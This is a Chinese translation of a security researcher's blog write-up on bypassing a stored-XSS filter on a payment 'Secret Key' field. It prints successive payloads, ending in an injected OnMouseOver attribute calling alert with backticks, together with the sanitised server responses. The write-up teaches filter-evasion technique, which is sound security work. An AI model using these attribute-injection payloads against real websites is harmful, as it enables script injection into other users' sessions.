<html>
<head>
<title>Story Of a Stored XSS Bypass</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">一个存储的XSS旁路的故事</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/story-of-a-stored-xss-bypass-26e6659f807b?source=collection_archive---------0-----------------------#2018-04-21">https://infosecwriteups.com/story-of-a-stored-xss-bypass-26e6659f807b?source=collection_archive---------0-----------------------#2018-04-21</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="0f1f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">嗨，读者们，</p><p id="eb48" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我是来自孟加拉国的网络安全研究员。这是我第一次写文章，我也不擅长XSS，所以原谅所有的错误。</p><p id="f2ed" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">最近我测试了一个私人网站，用户可以在里面添加他们的个人信息。我注意到那里有一个名为<strong class="jp ir"> Secret Key </strong>的输入，它允许用户处理支付并将交易信息存储到应用程序中。</p><p id="07f0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">所以我输入一个正常的有效载荷:-</p><blockquote class="kl km kn"><p id="3c42" class="jn jo ko jp b jq jr js jt ju jv jw jx kp jz ka kb kq kd ke kf kr kh ki kj kk ij bi translated">”&gt;<img src="x" onerror="prompt(document.domain)"/></p></blockquote><p id="e0bf" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">它被过滤了，页面来源是这样的:-</p><pre class="ks kt ku kv gt kw kx ky kz aw la bi"><span id="51b8" class="lb lc iq kx b gy ld le l lf lg">&lt;input type="text" id="****" name="****" value=""&gt;&amp;lt;img img" class="form-control" rel="gp" data-size="20" data-character-set="a-z,A-Z,0-9"&gt;</span></pre><p id="2639" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">所以从源头上我了解到:-</p><blockquote class="kl km kn"><p id="ffe2" class="jn jo ko jp b jq jr js jt ju jv jw jx kp jz ka kb kq kd ke kf kr kh ki kj kk ij bi translated">1.<strong class="jp ir">")</strong>和<strong class="jp ir">大于号(&gt; ) </strong>未被正确过滤。</p><p id="cb8f" class="jn jo ko jp b jq jr js jt ju jv jw jx kp jz ka kb kq kd ke kf kr kh ki kj kk ij bi translated">2.恶意标签正在被过滤。为此<strong class="jp ir"> &lt; img &gt; </strong>变成了<strong class="jp ir"> img img </strong></p></blockquote><p id="ca54" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">所以我有两种可能方法来执行JavaScript。<strong class="jp ir">第一个</strong>不知何故绕过了<strong class="jp ir">小于(&lt; ) </strong>过滤器，第<strong class="jp ir">第二个</strong>添加了一个恶意的<strong class="jp ir"> HTML属性</strong>来执行JavaScript。我尝试了很多方法来绕过<strong class="jp ir">小于(&lt; ) </strong>字符，但就是做不到。所以我用第二种方法添加了一个恶意的<strong class="jp ir"> HTML属性</strong>。所以我输入了下面的有效载荷:-</p><blockquote class="kl km kn"><p id="0c76" class="jn jo ko jp b jq jr js jt ju jv jw jx kp jz ka kb kq kd ke kf kr kh ki kj kk ij bi translated">" OnMouseOver=prompt(1)</p></blockquote><p id="90bf" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">回应为:- </strong></p><pre class="ks kt ku kv gt kw kx ky kz aw la bi"><span id="343e" class="lb lc iq kx b gy ld le l lf lg">&lt;input type="text" id="****" name="****" value="" OnMouseOver=prompt&amp;#40;" class="form-control" rel="gp" data-size="20" data-character-set="a-z,A-Z,0-9"&gt;</span></pre><p id="9e7a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">所以我可以添加一个HTML属性，但是括号被正确过滤了。所以我输入了下面的有效载荷:-</p><blockquote class="kl km kn"><p id="b543" class="jn jo ko jp b jq jr js jt ju jv jw jx kp jz ka kb kq kd ke kf kr kh ki kj kk ij bi translated">" OnMouseOver = prompt` 1</p></blockquote><p id="f69f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">回应为:- </strong></p><pre class="ks kt ku kv gt kw kx ky kz aw la bi"><span id="82a3" class="lb lc iq kx b gy ld le l lf lg">&lt;input type="text" id="****" name="****" value="" OnMouseOver=prompt`1`" class="form-control" rel="gp" data-size="20" data-character-set="a-z,A-Z,0-9"&gt;</span></pre><p id="af41" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">但是代码没有执行。仔细看看，有效载荷只需要一个<strong class="jp ir"/>🤔🤔🤔 :-</p><blockquote class="kl km kn"><p id="d764" class="jn jo ko jp b jq jr js jt ju jv jw jx kp jz ka kb kq kd ke kf kr kh ki kj kk ij bi translated">" OnMouseOver = " prompt` 1</p></blockquote><p id="e82f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">回应为:- </strong></p><pre class="ks kt ku kv gt kw kx ky kz aw la bi"><span id="c05e" class="lb lc iq kx b gy ld le l lf lg">&lt;input type="text" id="ipn_secret_keygen" name="ipn_secret_keygen" value=""OnMouseOver="alert`1`" class="form-control" rel="gp" data-size="20" data-character-set="a-z,A-Z,0-9"&gt;</span></pre><p id="0a60" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">看起来不错。现在我把鼠标指针放在输入上，而<strong class="jp ir"> OnMouseOver </strong>事件执行了XSS弹出窗口🤩🤩🤩</p><figure class="ks kt ku kv gt li gh gi paragraph-image"><div role="button" tabindex="0" class="lj lk di ll bf lm"><div class="gh gi lh"><img src="../Images/8971d85a19b9a727c35fc6bc1d8f4c17.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*KyLz3BiwjTTLTZTKViSj9A.png"/></div></div><figcaption class="lp lq gj gh gi lr ls bd b be z dk translated">XSS被处决了。</figcaption></figure><p id="15ea" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">感谢阅读。希望有时间再写一些帖子。</p><p id="6fdc" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在脸书上找到我:- </p><div class="lt lu gp gr lv lw"><a href="http://facebook.com/prial261" rel="noopener  ugc nofollow" target="_blank"><div class="lx ab fo"><div class="ly ab lz cl cj ma"><h2 class="bd ir gy z fp mb fr fs mc fu fw ip bi translated">普里阿勒·伊斯兰·汗</h2><div class="md l"><h3 class="bd b gy z fp mb fr fs mc fu fw dk translated">Prial Islam Khan在脸书。加入脸书，与Prial Islam Khan和您可能认识的其他人联系。脸书给…</h3></div><div class="me l"><p class="bd b dl z fp mb fr fs mc fu fw dk translated">facebook.com</p></div></div><div class="mf l"><div class="mg l mh mi mj mf mk ln lw"/></div></div></a></div></div></div>    
</body>
</html>